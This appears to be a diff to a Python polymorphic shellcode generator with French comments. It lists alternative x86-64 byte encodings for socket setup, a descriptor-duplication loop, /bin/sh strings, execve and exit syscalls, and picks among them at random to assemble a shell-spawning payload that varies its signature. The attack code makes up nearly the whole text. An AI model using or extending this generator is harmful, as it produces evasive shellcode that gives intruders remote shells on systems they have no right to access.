@@ -107,6 +107,17 @@ connexion_socket_11 = ["4831F6", "4D31C04C89C6", "40B6014080EE01"]
 #xor r9, r9 - mov r9b, 2 - mov sil, r9b -> 4D31C941B1024488CE
 
 connexion_socket_12 = ["40B602", "4D31C041B0024488C6", "4D31C941B1024488CE"]
+# Constant = 7df4 #.loop
+
+###### XOR START LOOP ######
+
+# xor rax, rax [Default] -> 4831c0
+
+# xor r8, r8
+# mov rax, r8 -> 4d31c04c89c0 
+
+# mov al, 1
+# sub al, 1 -> b0012c01
 
 ###### LOOP ######
 
@@ -122,6 +133,8 @@ connexion_socket_12 = ["40B602", "4D31C041B0024488C6", "4D31C941B1024488CE"]
 # add al, 0xb
 # add al, 0xb -> adda0badda0badda0b
 
+# Constante = B0210F0548ffce7df4
+
  ###### XOR BEFORE SYSCALL ######
 
 # xor rax, rax
@@ -134,13 +147,6 @@ connexion_socket_12 = ["40B602", "4D31C041B0024488C6", "4D31C941B1024488CE"]
 # xor rax, rdx
 # xor rdx, rdx -> 4889d04831d04831d2
 
- ###### SYSCALL EXIT ######
-
-# mov al, 60 -> B03C
-# mov al, 99 - sub al, 39 -> B0632C27
-# mov al, 30 - add al, 30 -> B01E041E
-# mov dl, 60 - mov rax, rdx -> B23C4889D0
-
 ####### /bin/sh ######
 
 # mov rbx, 0x68732f6e69622f2f [Default] -> 48BB2F2F62696E2F7368
@@ -152,6 +158,7 @@ connexion_socket_12 = ["40B602", "4D31C041B0024488C6", "4D31C941B1024488CE"]
 # mov rbx, 0x68733f5bd2cb3030 -> 48BB3030CBD25B3F73684881EB6969ED0F 
 # sub rbx, 0xfed6969
 
+# Constante = 50534889E750574889E6
 
 ###### SYSCALL EXECVE ######
 
@@ -159,6 +166,15 @@ connexion_socket_12 = ["40B602", "4D31C041B0024488C6", "4D31C941B1024488CE"]
 
 # mov al, 0x3a
 # add al, 0x01 -> B03A0401
+
+# Constante = 0f05
+
+ ###### SYSCALL EXIT ######
+
+# mov al, 60 -> B03C
+# mov al, 99 - sub al, 39 -> B0632C27
+# mov al, 30 - add al, 30 -> B01E041E
+# mov dl, 60 - mov rax, rdx -> B23C4889D0
 
 ###### XOR LAST SYSCALL ######
 
@@ -170,8 +186,11 @@ connexion_socket_12 = ["40B602", "4D31C041B0024488C6", "4D31C941B1024488CE"]
 # mov dl, 1
 # sub dl, 1 -> b20180ea01
 
+# Constante = 0f05
+
 list_exit = ["b03c", "b0632c27", "b01e041e", "b23c4889d0"]
 
+list_xorloop = ["4831c0", "4d31c04c89c0", "b0012c01"]
 list_loop = ["b021", "b0110410", "b0382c17", "adda0badda0badda0b"]
 list_xor = ["4831c04831d2", "4831d24831c0", "4889d04831d04831d2"]
 list_binbash = ["48BB2F2F62696E2F7368", "48BB310A4D586E2F73684881C3FE241511", "48BB3030CBD25B3F73684881EB6969ED0F"]
@@ -180,6 +199,8 @@ list_xorsyscall = ["4831FF", "4D31C04C89C2", "b20180ea01"]
 
 shellcode += random.choice(list_exit)
 print(shellcode)
+
+# Fonction qui permet l'ajout des /xFF/
 
 def shellcodize(s):
     shellcode = 'X'
